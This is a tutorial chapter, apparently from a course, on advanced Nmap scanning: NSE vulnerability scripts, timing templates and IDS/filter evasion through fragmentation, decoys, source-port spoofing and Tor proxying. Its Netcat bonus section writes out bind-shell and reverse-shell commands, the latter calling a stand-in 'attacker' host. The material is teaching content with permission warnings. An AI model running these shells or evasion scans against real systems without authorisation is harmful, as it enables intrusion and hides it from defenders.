# Phase 5: Further Probing

**Objective**  
Enhance your scans with the Nmap Scripting Engine (NSE), adjust timing for speed or stealth, and apply evasion techniques to bypass filters and intrusion detection.

---

## 1. Why Further Probing?

- **Deep Insight**  
  Leverage NSE scripts to discover vulnerabilities, configuration issues, and service details beyond simple port and version scans.

- **Performance Tuning**  
  Customize timing for large networks or situations requiring stealth.

- **Evasion & Bypass**  
  Circumvent simple packet filters, IDS/IPS, and rate-limiters to map defended perimeters.

---

## 2. Key Features & Options

| Feature                         | Option / Script Category     | Description                                                       |
|---------------------------------|------------------------------|-------------------------------------------------------------------|
| **Default & Safe Scripts**      | `-sC` / `--script=default`   | Run bundled, low-risk scripts for common discovery tasks.        |
| **Vulnerability Scripts**       | `--script=vuln`              | Check for known CVEs and misconfigurations (DoS, RCE, info leak).|
| **Custom Script Selection**     | `--script=<name|category>`   | Run specific scripts or entire categories (e.g., `auth`, `discovery`).|
| **Timing Templates**            | `-T0` … `-T5`                | Pre-configured timing: 0 (paranoid) → 5 (insane).                |
| **Rate Controls**               | `--min-rate`, `--max-retries`| Fine-tune packet send rate and retries.                           |
| **Packet Fragmentation**        | `-f`                          | Split probes into tiny fragments to evade simple filters.        |
| **Decoys**                      | `-D RND:10` or list          | Insert spoofed IPs to hide your real source.                     |
| **Source Port Spoofing**        | `--source-port <port>`       | Use a trusted port (e.g., 53) to bypass port-based filters.      |
| **MAC Spoofing**                | `--spoof-mac <vendor|mac>`   | Change Ethernet MAC to hide device identity (LAN only).          |
| **Bad Checksums**               | `--badsum`                   | Send invalid checksums to detect stateless filters.              |
| **Proxy Chains**                | `--proxies <list>`           | Tunnel through HTTP or SOCKS4 proxies for TCP scans.             |
| **IP Options**                  | `--ttl`, `--ip-options`      | Set IP TTL or insert header options (record-route, source-route).|

---

## 3. Examples

1. **Run Safe Discovery Scripts**  
   ```bash
   nmap -sC -p 22,80,443 <target>
   ```
   > Executes default scripts like `http-title`, `ssh-hostkey`, `traceroute`.

2. **Check for Vulnerabilities**
   ```bash
   nmap --script vuln -p 21,80,443 <target>
   ```
   > Scans for known issues using scripts in the `vuln` category.

3. **Aggressive Scan with Timing**
   ```bash
   nmap -A -T4 <target>
   ```
   > Version, OS, scripts, traceroute at faster speed.

4. **Slow, Stealthy Scan**
   ```bash
   nmap -sS -T1 --max-retries 1 --host-timeout 10m <target>
   ```
   > Paranoid timing to evade IDS and avoid panic resets.

5. **Fragmented SYN Scan**
   ```bash
   sudo nmap -sS -f <target>
   ```
   > Tiny packet fragments that simple filters may not reassemble.

6. **Decoy Scan**
   ```bash
   nmap -sS -D 1.2.3.4,ME,5.6.7.8 -p 80,443 <target>
   ```
   > Mixes your IP (`ME`) with others to mask the true source.

7. **Source Port Spoofing**
   ```bash
   sudo nmap -sS --source-port 53 -p 80 <target>
   ```
   > Sends probes from port 53, appearing as DNS traffic.

8. **Proxying Through SOCKS4**
   ```bash
   nmap -sT --proxies socks4://127.0.0.1:9050 -p 80,443 <target>
   ```
   > Routes TCP connect scans through a local SOCKS proxy (e.g., Tor).

---

## 4. Interpreting Advanced Scan Results

* **Script Outputs**
  Look for script-specific sections in the scan report (e.g., `| ssl-enum-ciphers:` or `| smb-vuln-ms17-010:`).

* **Timing Warnings**
  If Nmap warns about dropped packets or timeouts, consider adjusting `-T` or `--max-retries`.

* **Anomaly Detection**
  Fragmentation or bad-checksum results may show "open|filtered" where regular scans differ.

* **Decoy Artifacts**
  Proxy/Decoy scans will show your spoofed IPs in output; identify true source via verbose flags.

---

## 5. Hands-On Exercises

1. **Safe vs. Full Script Scan**
   * Compare:
     ```bash
     nmap -sC <target>  
     nmap --script=default,safe <target>
     ```
   * Note differences in script coverage and output.

2. **Vuln Category Sweep**
   * Run:
     ```bash
     nmap --script vuln <target>
     ```
   * Document any findings and research one CVE per issue.

3. **Timing Template Trade-off**
   * Scan the same host with `-T0`, `-T3`, and `-T5`.
   * Measure scan duration vs. packet loss or filter detection.

4. **Evasion Techniques Challenge**
   * Attempt to scan a host protected by a basic iptables rule dropping SYNs:
     ```bash
     sudo iptables -A INPUT -p tcp --dport 80 -j DROP
     ```
   * Try `-f`, `-D`, `--source-port`, and find which bypass works.

5. **Proxy Chain Scan**
   * Set up Tor on local machine (`tor && torsocks nmap ...`).
   * Perform a TCP connect scan through Tor:
     ```bash
     nmap -sT --proxies socks4://127.0.0.1:9050 <target>
     ```

---

## 6. Tips & Best Practices

* **Update NSE Scripts** frequently:
  ```bash
  sudo nmap --script-updatedb
  ```
* **Use verbose (`-v`)** or debug (`-d`) flags to troubleshoot timeouts.
* **Combine techniques** thoughtfully: too many evasion tricks can trigger alarms.
* **Log all scans** and outputs for audit trails.
* **Respect legal boundaries**—only probe systems you own or have permission to test.

## Netcat Bonus: Interactive Probing & Pivoting

Once you've identified a live host and open port, use Ncat to:

1. **Bind Shell** (Target listens, you connect)
   ```bash
   ncat -l -p 4444 -e /bin/bash
   ```
   **Command breakdown:**
   - `-l` = Listen mode (act as server)
   - `-p 4444` = Listen on port 4444
   - `-e /bin/bash` = Execute bash when connection received

2. **Reverse Shell** (You listen, target connects)
   ```bash
   ncat attacker:4444 -e /bin/bash
   ```
   **Command breakdown:**
   - `attacker:4444` = Connect to attacker's IP on port 4444
   - `-e /bin/bash` = Execute bash and send I/O over connection

3. **File Transfer** (Simple file sharing)
   ```bash
   # Receiver (run first)
   ncat -l 5555 > received.file
   
   # Sender (run second)  
   ncat <target> 5555 < send.file
   ```
   **How it works:**
   - Receiver listens on port 5555, saves incoming data to file
   - Sender connects and transmits file contents
   - Connection closes when file transfer completes

4. **Proxy Chaining** (Route through intermediary)
   ```bash
   ncat --proxy 10.0.0.5:8080 --proxy-type http target.com 443
   ```
   **Command breakdown:**
   - `--proxy 10.0.0.5:8080` = Route through proxy server
   - `--proxy-type http` = Use HTTP CONNECT method
   - `target.com 443` = Final destination

⚠️ **Use these only in your own lab networks or with explicit permission.**

> 💡 **Want to learn more Netcat techniques?** Check out our [Netcat Learning Guide](../netcat/) for comprehensive coverage including advanced pivoting, data exfiltration, and network troubleshooting.

---

With **Further Probing** complete, you now have end-to-end mastery of Nmap's core phases—ready to automate, integrate, or teach these techniques. 🎉
